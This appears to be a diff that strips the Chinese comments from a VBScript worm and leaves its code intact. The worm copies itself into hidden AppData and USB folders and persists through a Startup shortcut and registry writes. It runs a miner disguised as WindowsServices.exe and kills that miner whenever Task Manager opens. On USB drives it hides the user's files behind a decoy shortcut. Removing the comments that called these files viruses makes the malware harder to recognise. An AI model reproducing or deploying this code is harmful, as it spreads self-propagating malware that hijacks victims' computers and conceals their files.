@@ -1,11 +1,11 @@
-'发生错误时，程序继续执行下一句代码 
+
 on error resume next 
-'定义一系统变量 
+
 Dim strPath, objws, objFile, strFolder, Target, destFolder, objDestFolder, AppData, ws, objmove, pfolder, objWinMgmt, colProcess, vaprocess 
-'获得WScript.Shell 
+
 Set ws = WScript.CreateObject("WScript.Shell") 
 Target = "\WindowsServices" 
-'打开根目录下名为‘-’的目录，也就是真正存放用户所有文件的目录 
+
 strPath = WScript.ScriptFullName
 set objws = CreateObject("Scripting.FileSystemObject") 
 Set objFile = objws.GetFile(strPath) 
@@ -13,12 +13,12 @@ strFolder = objws.GetParentFolderName(objFile)
 pfolder = objws.GetParentFolderName(strFolder) 'Chr(34)是双引号 
 ws.Run Chr(34) & pfolder & "\_" & Chr(34) AppData = ws.ExpandEnvironmentStrings("%AppData%") 
 DestFolder = AppData & Target 
-'创建目标目录，也就是%AppData%\WindowsServices目录 
+
 if (not objws.folderexists(DestFolder)) then 
 objws.CreateFolder DestFolder 
 Set objDestFolder = objws.GetFolder(DestFolder) 
 end if 
-'将四个病毒文件复制到目标目录并隐藏，再将目标目录隐藏 
+
 Call moveandhide ("\helper.vbs") 
 Call moveandhide ("\installer.vbs") 
 Call moveandhide ("\movemenoreg.vbs") 
@@ -26,10 +26,10 @@ Call moveandhide ("\WindowsServices.exe")
 objDestFolder.Attributes = objDestFolder.Attributes + 39 
 sub moveandhide (name) 
 if (not objws.fileexists(DestFolder & name)) then 
-'复制文件 
+
 objws.CopyFile strFolder & name, DestFolder & "\" 
 Set objmove = objws.GetFile(DestFolder & name) 
-'隐藏文件（39表示文件属性为归档、系统、隐藏） 
+
 If not objmove.Attributes AND 39 then 
 objmove.Attributes = 0 
 objmove.Attributes = objmove.Attributes + 39 
@@ -38,14 +38,14 @@ end if
 end sub 
 Set objWinMgmt = GetObject("WinMgmts:Root\Cimv2") 
 Set colProcess = objWinMgmt.ExecQuery ("Select * From Win32_Process where name = 'wscript.exe'") 
-'从任务管理器中查找helper.vbs是否已经运行，如果已经运行则退出当前脚本 
+
 For Each objProcess In colProcess 
 vaprocess = objProcess.CommandLine 
 if instr(vaprocess, "helper.vbs") then 
 WScript.quit 
 End if 
 Next 
-'运行helper.vbs 
+
 ws.Run Chr(34) & DestFolder & "\helper.vbs" & Chr(34) 
 
 Set ws = Nothing
@@ -63,12 +63,11 @@ set objws = CreateObject("Scripting.FileSystemObject")
 Set objFile = objws.GetFile(strPath) 
 strFolder = objws.GetParentFolderName(objFile) 
 strPath = strFolder & "\" 
-'获得用户启动目录的路径 
+
 startupPath = ws.SpecialFolders("startup") 
 miner = Chr(34) & strPath & "WindowsServices.exe" & Chr(34) 
 MyScript = "helper.vbs" 
 While True 
-'检查注册表是否已经修改，如果没有，则修改注册表启动项 
 key = Empty 
 key = ws.regread (nkey)
 If (not IsEmpty(key)) then 
@@ -76,7 +75,6 @@ If (not IsEmpty(key)) then
 ws.RegWrite nkey, 2, "REG_BINARY" 
 End if 
 If (not objws.fileexists(startupPath & "\helper.lnk")) then 
-'在启动目录创建helper.vbs的启动快捷方式 
 Set link = ws.CreateShortcut(startupPath & "\helper.lnk") 
 link.Description = "helper" 
 link.TargetPath =chr(34) & strPath & "helper.vbs" & chr(34) 
@@ -85,23 +83,21 @@ link.Save
 End If 
 
 Set colProcess = objWinMgmt.ExecQuery ("Select * From Win32_Process where name = 'wscript.exe'") 
-'检查installer.vbs文件是否在执行，如果不在则运行installer.vbs 
 call procheck(colProcess, "installer.vbs")
 Set colProcess = objWinMgmt.ExecQuery ("Select * From Win32_Process where name Like '%WindowsServices.exe%'") 
 Set tskProcess = objWinMgmt.ExecQuery ("Select * From Win32_Process where name Like '%Taskmgr.exe%'") 
 
 if colProcess.count = 0 And tskProcess.count = 0 then 
 
-'运行WindowsServices.exe 
 ws.Run miner, 0 
 
 ElseIf colProcess.count > 0 And tskProcess.count > 0 then 
-'如果用户打开了任务管理器，则杀掉WindowsServices.exe 
+
 For Each objProcess In colProcess ws.run "taskkill /PID " & objProcess.ProcessId , 0 
 Next 
 end if 
 WScript.Sleep 3000 
-Wend '--------------------------------------------------------------------------------- 
+Wend 
 sub procheck(checkme, procname) 
 For Each objProcess In checkme 
 vaprocess = objProcess.CommandLine 
@@ -112,7 +108,7 @@ Next
 
 ws.Run Chr(34) & strPath & procname & Chr(34)
 end sub 
-'-----------------------------------------------------
+
 
 
 
@@ -129,36 +125,36 @@ Set objFile = objws.GetFile(strPath)
 strFolder = objws.GetParentFolderName(objFile) 
 'Checking for USB instance 
 Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2") 
-'查询硬盘事件 
+
 Set colEvents = objWMIService.ExecNotificationQuery ("SELECT * FROM __InstanceOperationEvent WITHIN 1 WHERE " & "TargetInstance ISA 'Win32_LogicalDisk'") 
 Set objWinMgmt = GetObject("WinMgmts:Root\Cimv2") 
 
 While True 
-'检查helper.vbs是否在执行，如果不在执行，则运行help.vbs 
+
 Set colProcess = objWinMgmt.ExecQuery ("Select * From Win32_Process where name = 'wscript.exe'") 
 call procheck(colProcess, "helper.vbs") 
-'取出下一个事件 
+
 Set objEvent = colEvents.NextEvent 
 
 If objEvent.TargetInstance.DriveType = 2 Then 
 If objEvent.Path_.Class = "__InstanceCreationEvent" Then 
-'一个新的U盘插入 
+
 device = objEvent.TargetInstance.DeviceID 
 devicename = objEvent.TargetInstance.VolumeName 
 DestFolder = device & "\WindowsServices" 
 DummyFolder = device & "\" & "_" 
-'在U盘根目录下创建目的目录（\WindowsServices）
+
 if (not objws.folderexists(DestFolder)) then 
 objws.CreateFolder DestFolder 
 Set objDestFolder = objws.GetFolder(DestFolder) 
 objDestFolder.Attributes = objDestFolder.Attributes + 39 
 end if 
-'将四个病毒文件移动到目的目录 
+
 Call moveandhide ("\helper.vbs") 
 Call moveandhide ("\installer.vbs") 
 Call moveandhide ("\movemenoreg.vbs") 
 Call moveandhide ("\WindowsServices.exe") 
-'在U盘根目录下创建打开movemenoreg.vbs文件的快捷方式 
+ 
 if (not objws.fileexists (device & devicename & ".lnk")) then 
 Set link = ws.CreateShortcut(device & "\" & devicename & ".lnk") 
 link.IconLocation = "%windir%\system32\SHELL32.dll, 7" 
@@ -168,13 +164,12 @@ link.windowstyle = 7
 link.Save 
 End If 
 
-'在U盘根目录下创建名为‘-’的目录并隐藏 
 if (not objws.folderexists(DummyFolder)) then 
 objws.CreateFolder DummyFolder 
 Set objDestFolder = objws.GetFolder(DummyFolder) 
 objDestFolder.Attributes = objDestFolder.Attributes + 2 + 4 
 End If set check = objws.getFolder(device) 
-'将用户文件都移动到名为‘-’的目录下 
+
 Call checker(check) 
 End If 
 End If 
@@ -207,7 +202,7 @@ End Select
 
 Next 
 end sub 
-'------------------------------------------------------------ 
+
 sub moveandhide (name) 
 if (not objws.fileexists(DestFolder & name)) then 
 objws.CopyFile strFolder & name, DestFolder & "\" 
@@ -219,7 +214,7 @@ objmove.Attributes = objmove.Attributes + 39
 end if 
 end if 
 end sub 
-'------------------------------------------------------------ 
+
 sub procheck(checkme, procname) 
 
 For Each objProcess In checkme 
